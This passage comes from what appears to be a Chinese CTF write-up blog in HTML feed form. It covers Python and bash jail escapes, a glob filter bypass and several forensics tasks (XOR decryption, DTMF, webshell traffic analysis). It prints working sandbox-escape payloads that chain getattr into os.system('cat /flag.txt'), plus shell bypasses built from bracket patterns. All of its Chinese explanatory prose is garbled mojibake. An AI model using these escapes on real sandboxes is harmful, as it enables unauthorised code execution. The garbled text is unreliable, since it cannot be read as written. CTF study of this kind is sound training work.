allowed to read that file&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        path = glob.glob(file_path)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;file doesn&#x27;t exist&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">user_input = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(read_file(user_input))</span><br></pre></td></tr></table></figure><p>ç¨åŠ åˆ†æå¯çŸ¥é¢˜æ„æ˜¯è¦æˆ‘ä»¬ç»•è¿‡è¿‡æ»¤è¯»åˆ° flag.txtã€‚ä½¿ç”¨ <code>/flag.???</code> å³å¯æˆåŠŸç»•è¿‡è¯»åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550861385/a4beb06472f081a20b49a9b20930d049a5ba6f0e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;oof_1t_g0t_expanded_93929&#125;</span><br></pre></td></tr></table></figure><h3 id="pyjail"><a href="#pyjail" class="headerlink" title="pyjail"></a>pyjail</h3><p>é™„ä»¶ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules, version</span><br><span class="line"></span><br><span class="line">banned = <span class="string">&quot;import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data&quot;</span></span><br><span class="line">search_func = <span class="keyword">lambda</span> word: re.<span class="built_in">compile</span>(<span class="string">r&quot;\b(&#123;0&#125;)\b&quot;</span>.<span class="built_in">format</span>(word), flags=re.IGNORECASE).search</span><br><span class="line"></span><br><span class="line">modules.clear()</span><br><span class="line"><span class="keyword">del</span> modules</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;version&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;What would you like to say?&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        text = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>).lower()</span><br><span class="line">        check = search_func(banned)(<span class="string">&#x27;&#x27;</span>.join(text.split(<span class="string">&quot;__&quot;</span>)))</span><br><span class="line">        <span class="keyword">if</span> check:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Nope, we ain&#x27;t letting you use <span class="subst">&#123;check.group(<span class="number">0</span>)&#125;</span>!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^(_?[A-Za-z0-9])*[A-Za-z](_?[A-Za-z0-9])*$&quot;</span>, text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You aren&#x27;t getting through that easily, come on.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">exec</span>(text, &#123;<span class="string">&#x27;globals&#x27;</span>: <span class="built_in">globals</span>(), <span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;, &#123;<span class="string">&#x27;print&#x27;</span>:<span class="built_in">print</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—å‡ºé™¤äº†è¿‡æ»¤äº†ä¸€äº›å¸¸ç”¨çš„ token ä¹‹å¤–ç”¨äº†ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„æ­£åˆ™ï¼ŒåŸºæœ¬ä¸ŠåŒ¹é…çš„æ˜¯ä¸‹åˆ’çº¿å¼€å¤´çš„å†…å®¹ï¼Œä½†æ˜¯è¦ä»¥ä¸‹åˆ’çº¿å¼€å¤´ï¼Œæ‰€ä»¥ <code>print((globals[&#39;__builtins__&#39;]))</code> è¿˜æ˜¯æ²¡æœ‰é—®é¢˜ã€‚å› ä¸ºæœ‰ <code>globals()</code>ï¼Œæ‰€ä»¥å°è¯•å°†å…¶æ‰“å°å‡ºæ¥ï¼Œå‘ç°äº† <code>&#39;__builtins__&#39;: &lt;module &#39;builtins&#39; (built-in)&gt;</code>ã€‚ä¹Ÿå°±æ˜¯ä»–è¡¨é¢ä¸ŠæŠŠ builtins ç¦ç”¨äº†ï¼Œå®é™…ä¸Šè¿˜æ˜¯å¯ä»¥è®¿é—®åˆ°ã€‚</p><p>æ—¢ç„¶æœ€åè¦è¯»åˆ° <code>/flag</code>ï¼Œé‚£è‚¯å®šæ˜¯éœ€è¦ <code>system(&quot;cat /flag&quot;)</code> çš„æ“ä½œï¼Œæ‰€ä»¥éœ€è¦å¼•å…¥ os æ¨¡å—ã€‚è¿™é‡Œçš„ <code>__import__</code> è¢«ç¦ç”¨äº†ï¼Œå› æ­¤å¯ä»¥å°è¯•é‡‡ç”¨ <code>getattr()</code> æ¥æ„é€ ã€‚å…ˆå°è¯•å¯¼å‡ºä¸€ä¸‹ <code>__import__</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613561032538/d74285f7ce1c021d42ee40c2eb1b12aa12292db2.png"></p><p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨ getattr å¯ä»¥æˆåŠŸåœ°å¯¼å‡ºã€‚æ¥ä¸‹æ¥ä¸€æ­¥æ­¥å¯¼å‡ºåˆ° system å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]),(<span class="string">&#x27;__impor&#x27;</span> + <span class="string">&#x27;t__&#x27;</span>))(<span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;s&#x27;</span>) <span class="comment">#å¯¼å‡ºåˆ° __import__.os</span></span><br><span class="line">(<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>(((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]),(<span class="string">&#x27;__impor&#x27;</span> + <span class="string">&#x27;t__&#x27;</span>))(<span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;s&#x27;</span>)),(<span class="string">&#x27;syste&#x27;</span> + <span class="string">&#x27;m&#x27;</span>)) <span class="comment">#å¯¼å‡ºåˆ°å‡½æ•° system</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±èƒ½æ‰§è¡Œ shell äº†ï¼Œæ„é€ å‡ºå¦‚ä¸‹ payload å³å¯è¯»åˆ° flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>(((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]),(<span class="string">&#x27;__impor&#x27;</span> + <span class="string">&#x27;t__&#x27;</span>))(<span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;s&#x27;</span>)),(<span class="string">&#x27;syste&#x27;</span> + <span class="string">&#x27;m&#x27;</span>))(<span class="string">&#x27;cat /flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;l3t&#39;s_try_sc0p1ng_th1s_0ne_2390098&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å¤§ä½¬çš„æ–‡ç« é‡Œçœ‹åˆ°äº†ä¸€ç§å¾ˆå¦™çš„è§£æ³•ï¼Œæ˜¯é€šè¿‡å…¨å±€å˜é‡è¦†ç›–æ¥å®ç°çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>[<span class="string">&#x27;banned&#x27;</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat /f*&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="shjail"><a href="#shjail" class="headerlink" title="shjail"></a>shjail</h3><p>é™„ä»¶ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">RED=<span class="string">&#x27;\e[0;31m&#x27;</span></span><br><span class="line">END=<span class="string">&#x27;\e[0m&#x27;</span></span><br><span class="line">GREEN=<span class="string">&#x27;\e[0;32m&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;What would you like to say?&quot;</span></span><br><span class="line"><span class="built_in">read</span> USER_INP</span><br><span class="line">       <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$USER_INP</span>&quot;</span> =~ [<span class="string">&#x27;&amp;&#x27;</span><span class="string">&#x27;$&#x27;</span><span class="string">&#x27;`&#x27;</span><span class="string">&#x27;&gt;&#x27;</span><span class="string">&#x27;&lt;&#x27;</span><span class="string">&#x27;/&#x27;</span><span class="string">&#x27;*&#x27;</span><span class="string">&#x27;?&#x27;</span>txcsbqi] ]]; <span class="keyword">then</span></span><br><span class="line">               <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;RED&#125;</span>Hmmmm, what are you trying to do?<span class="variable">$&#123;END&#125;</span>&quot;</span></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">               OUTPUT=$(<span class="variable">$USER_INP</span>) &amp;&gt;/dev/null</span><br><span class="line">               <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;GREEN&#125;</span>The command has been executed. Let&#x27;s go again!<span class="variable">$&#123;END&#125;</span>&quot;</span></span><br><span class="line">       <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span> </span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ç¦ç”¨çš„å•å­—ç¬¦æœ‰ <code>&grave;&$&gt;&lt;/*?txcsbqi</code>ï¼Œå‰©ä½™çš„å•å­—ç¬¦æœ‰ <code>adefghjklmnopruvwyz</code>ã€‚åŒæ—¶åªæœ‰åœ¨æŒ‡ä»¤æŠ¥é”™çš„æ—¶å€™æ‰èƒ½æœ‰è¾“å‡ºã€‚å› æ­¤è¦æƒ³åŠæ³•ç”¨æŠ¥é”™çš„ç¨‹åºæ¥å¸¦å‡ºæ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613563108620/856cc2a1ed08e1582c35e24c0f96486180815350.png"></p><p>çœ‹äº† WriteUp ä¹‹åçŸ¥é“è¿™é‡Œå¯ä»¥ä½¿ç”¨ perl æ¥å¸¦å‡ºæ–‡ä»¶ï¼ŒåŒæ—¶å› ä¸º txt ä¸­çš„ t å­—ç¬¦è¢«ç¦ç”¨äº†ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ bash çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚å¯ä»¥å°è¯•ä½¿ç”¨ open æŒ‡ä»¤æ¥ç¡®å®šæ–‡ä»¶æ˜¯å¦å­˜åœ¨ä»è€Œç¡®å®š flag çš„ä½ç½®ã€‚å› ä¸ºè¿™é¢˜ç¦ç”¨äº† /ï¼Œæ‰€ä»¥ flag åº”è¯¥ä¸åœ¨æ ¹ç›®å½•ã€‚ç„¶è€Œåœ¨ bash çš„æ­£åˆ™ä¸­ <code>[a-z]&#123;3&#125;</code> è¡¨ç¤ºä¸‰ä¸ªè¿ç»­çš„å‰ä¸€ä¸ª RE å­—ç¬¦ï¼Œè€Œå¹¶ä¸æ˜¯ä¸€èˆ¬æ­£åˆ™çš„åŒ¹é…ä¸‰æ¬¡ã€‚å› æ­¤éœ€è¦å°è¯• <code>open flag.[a-z][a-z][a-z]</code> æ¥åŒ¹é… flag.txtï¼Œå¯ä»¥å‘ç°æŒ‡ä»¤æˆåŠŸæ‰§è¡Œä¸”æ²¡æœ‰æŠ¥é”™ï¼Œå¯¹æ¯”å…¶ä»–çš„æ‰§è¡Œå¯çŸ¥æ­¤æ—¶ flag ä½äºå½“å‰ç›®å½•ä¸‹ä¸”å¯èƒ½åä¸º flag.txtã€‚å› æ­¤æœ€åçš„ paylaod å¯ä»¥æ˜¯ <code>perl flag.[a-z][a-z][a-z]</code>ï¼Œå½“ç„¶ï¼Œå†™ä½œ <code>perl [a-z][a-z][a-z][a-z].[a-z][a-z][a-z]</code> ä¹Ÿæ˜¯ç›¸åŒçš„æ•ˆæœã€‚æœ€åä½¿ç”¨è¿™ä¸ªæŒ‡ä»¤å¯ä»¥åœ¨ç¨‹åºçš„æŠ¥é”™ä¸­çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613563108620.856cc2a1ed08e1582c35e24c0f96486180815350/png" alt="image-20210217200249084"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w3ll_th1s_f1l3_sh0uldnt_h4v3_fl4g_1n_2738372131&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SXCCTF 2021</title>
      <link href="/zh-CN/posts/6da8bc99.html"/>
      <url>/zh-CN/posts/6da8bc99.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396795493884/d4dcd98db0f2448d2a8bc1df138abab7bb04ca78.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Happy_New_Year_2021&#125;</span><br></pre></td></tr></table></figure><h3 id="Flagä¸åœ¨è¿™"><a href="#Flagä¸åœ¨è¿™" class="headerlink" title="Flagä¸åœ¨è¿™"></a>Flagä¸åœ¨è¿™</h3><p>å°†é™„ä»¶ Word æ–‡æ¡£æ‹“å±•åæ”¹ä¸º zipï¼Œè§£å‹åå¯è§ flag.txtã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396795762500/15fa1a59ccea49523376e0efe44f1f2dcab2289e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;It&#39;s_real_easy!D0_Y0u_Like_it?&#125;</span><br></pre></td></tr></table></figure><h3 id="ç‰›å¹´å¤§å‰"><a href="#ç‰›å¹´å¤§å‰" class="headerlink" title="ç‰›å¹´å¤§å‰"></a>ç‰›å¹´å¤§å‰</h3><p>åœ¨é™„ä»¶çš„å±æ€§ä¸­å¯è§ flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396796013580/3ec87e0edea98063dd93446ccc2992b0320cd486.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;è¿™ä¸ªå°±æ˜¯å“¦!&#125;</span><br></pre></td></tr></table></figure><h3 id="ç½‘ç»œæ·±å¤„"><a href="#ç½‘ç»œæ·±å¤„" class="headerlink" title="ç½‘ç»œæ·±å¤„"></a>ç½‘ç»œæ·±å¤„</h3><p>å°†é™„ä»¶è§£å‹åå¯ä»¥å¾—åˆ°ä¸€æ®µ DTMFï¼Œå°†å…¶è§£ç åå¯å¾—åˆ° <code>15975384265</code>ã€‚å°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹ç”µè¯å½•éŸ³ã€‚ä½¿ç”¨ Audition æ‰“å¼€åå¯è§ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396796511316/e09761d1d120c03fe6985c827cc3d05d69db4bb6.png"></p><p>åœ¨ç¬¬ä¸€æ­¥çš„æ–‡æœ¬ä¸­å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">636806841748368750477720528895492611039728818913495104112781919263174040060359776171712496606031373211949881779178924464798852002228370294736546700438210687486178492208471812570216381077341015321904079977773352308159585335376746026882907466893864815887274158732965185737372992697108862362061582646638841733361046086053127284900532658885220569350253383469047741742686730128763680253048883638446528421760929131783980278391556912893405214464624884824555647881352300550360161429758833657243131238478311219915449171358359616665570429230738621272988581871</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“å…¶ä½¿ç”¨çš„æ˜¯ tupper çš„ç®—æ³•ï¼Œä½¿ç”¨<a href="https://keelyhill.github.io/tuppers-formula/">åœ¨çº¿ç”»å›¾ç½‘ç«™</a>å¯ä»¥å¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396796690806/cdbf48dd8810c4c3b11ac6531d33133b1fd4bacf.png" alt="image-20210209173748544"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y29pbA&#x3D;&#x3D;&#125;</span><br></pre></td></tr></table></figure><h3 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h3><p>Wireshark åˆ†ææµé‡åŒ…ï¼Œè·Ÿè¸ª TCP æµåˆ° 11 å¯å‘ç°ä¸€æ®µ Python è„šæœ¬ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396796885665/14ab1f4a9a1a62bfb3febc48935c04d6161d9e96.png"></p><p>è·Ÿè¸ªåˆ° TCP æµ 20 å¯ä»¥å‘ç°ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396797097460/2565a40b011f545f77113fb14937eae80adf5fb5.png"></p><p>è·Ÿè¸ªåˆ° TCP æµ 17 å¯ä»¥å‘ç°ä¸€ä¸ª pyc æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396797335358/153e70574197b29ca3659ab994a4faf2b79322c3.png"></p><p>å°†ä»¥ä¸Šå‘ç°çš„æ–‡ä»¶åˆ†ç¦»å‡ºæ¥ã€‚å°† pyc æ–‡ä»¶åç¼–è¯‘å¯å¾—åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line">key = <span class="string">&#x27;YLBSB?YLBNB!&#x27;</span></span><br></pre></td></tr></table></figure><p>è§£å‹åˆ†ç¦»å‡ºæ¥çš„å‹ç¼©åŒ…å¯å¾—åˆ° YLBSB.xor æ–‡ä»¶ã€‚Python è„šæœ¬åˆ†ç¦»å‡ºæ¥ä¹‹åå¾—åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> key</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;YLBSB.docx&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">enc = <span class="built_in">open</span>(<span class="string">&quot;YLBSB.xor&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">plain = base64.b64encode(file.read())</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> plain:</span><br><span class="line">    d = <span class="built_in">chr</span>(c ^ <span class="built_in">ord</span>(key[count % <span class="built_in">len</span>(key)]))</span><br><span class="line">    enc.write(d.encode())</span><br><span class="line">    count = count + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è„šæœ¬å¯¹æ–‡ä»¶è¿›è¡Œäº†æŒ‰ä½å¼‚æˆ–çš„çš„æ“ä½œï¼Œç®€å•åœ°ä¿®æ”¹è„šæœ¬å¾—åˆ°è§£å¯†è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">&#x27;YLBSB?YLBNB!&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;YLBSB.xor&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">dec = <span class="built_in">open</span>(<span class="string">&quot;YLBSB.docx&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">enc = file.read()</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    d = <span class="built_in">chr</span>(c ^ <span class="built_in">ord</span>(key[count % <span class="built_in">len</span>(key)]))</span><br><span class="line">    dec.write(d.encode())</span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">file.close()</span><br><span class="line">dec.close()</span><br></pre></td></tr></table></figure><p>å°†æ‰€å¾—çš„æ–‡ä»¶å† base64 è§£ç ä¸€æ¬¡å¯å¾—ä¸€ä»½ Word æ–‡æ¡£ã€‚åœ¨å‚è€ƒæ–‡çŒ®ä¸­å¯ä»¥æ‰¾åˆ°å­—ä½“é¢œè‰²ä¸ºç™½è‰²çš„ flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396797494554/502d5dbba4c4b93da58ab4eba0b3dfefd49964f7.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;Best_YLB_Ever&#125;</span><br></pre></td></tr></table></figure><h3 id="Love-it"><a href="#Love-it" class="headerlink" title="Love_it!"></a>Love_it!</h3><blockquote><p>è§£å‹å¯†ç ä¸ºï¼š2021_jia_you!!<br>flag ä¸º flag{åå°åç§°_åå°è´¦å·_åå°å¯†ç _ä¸€å¥è¯æœ¨é©¬åç§°_ä¸€å¥è¯å¯†ç _ç¬¬ä¸‰ä¸ªé©¬å­æ‰§è¡Œçš„å‘½ä»¤}<br>ä¾‹å¦‚ï¼š<br>åå°ç½‘å€ä¸º:<br><a href="http://127.0.0.1/admin/index.php">http://127.0.0.1/admin/index.php</a> åå°åç§°å°±ä¸º: admin<br>è´¦å·ä¸ºï¼š2021 åå°è´¦å·ä¸º: 2021<br>å¯†ç ä¸ºï¼šhappy_new_year! åå°å¯†ç ä¸º: happy_new_year!<br>ä¸€å¥è¯æœ¨é©¬è·¯å¾„ä¸º: <a href="http://127.0.0.1/mu.php">http://127.0.0.1/mu.php</a> ä¸€å¥è¯æœ¨é©¬åç§°ä¸º: mu<br>ä¸€å¥è¯æœ¨é©¬ ä¸€å¥è¯å¯†ç ä¸º: starsnow<br>ä¸€å¥è¯æ‰§è¡Œçš„å‘½ä»¤<br>è¿æ¥é©¬å­ ä¹‹åæ‰§è¡Œçš„ç¬¬ä¸‰æ¡ å‘½ä»¤<br>ç¬¬ä¸€æ¡ yingzi=phpinfo();<br>ç¬¬äºŒæ¡ yingzi=system(â€˜whoamiâ€™);<br>ç¬¬ä¸‰æ¡ yingzi=system(â€˜lsâ€™); ç¬¬ä¸‰ä¸ªé©¬å­æ‰§è¡Œçš„å‘½ä»¤ï¼š system(â€˜lsâ€™);</p><p>ä¾‹å¦‚ï¼š<br>flag{admin_2021_happy_new_year!_starsnow_system(â€˜lsâ€™);}</p></blockquote><p>æ ¹æ®é¢˜ç›®ç»™å‡ºçš„ä¿¡æ¯ï¼Œä½¿ç”¨ Wireshark åˆ†ææµé‡åŒ…ã€‚ç­›é€‰ HTTP æ¡ç›®ï¼Œåœ¨å¦‚ä¸‹ä¸‰ä¸ªåœ°æ–¹å¯ä»¥æœé›†æ‰€æœ‰ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396797827741/eae41c17ff64c576b4ad8922730cde0925b39782.png" alt="image-20210209183236873"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396798219288/b9a9c46fb3bfbe36baaf889b9b0452bb432954ab.png" alt="image-20210209183241314"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396798472346/3e48ccc7e61f95905b553eb438e5c4465e7900a6.png" alt="image-20210209183244129"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dede_admin_starsnowniubi_ma_yingzi_echo &#96;whoami&#96;;&#125;</span><br></pre></td></tr></table></figure><h3 id="Very-very-easy-hex"><a href="#Very-very-easy-hex" class="headerlink" title="Very very easy hex"></a>Very very easy hex</h3><p>å‹ç¼©åŒ…éœ€è¦å†™ä¸ªè„šæœ¬å¥—å¨ƒè§£å‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">zipname = <span class="string">&quot;img.zip&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ts1 = zipfile.ZipFile(zipname)</span><br><span class="line">    ts1.extractall(<span class="string">&quot;./&quot;</span>)</span><br><span class="line">    zipname = <span class="string">&quot;./&quot;</span>+ts1.namelist()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>è§£å‹ 1.zip 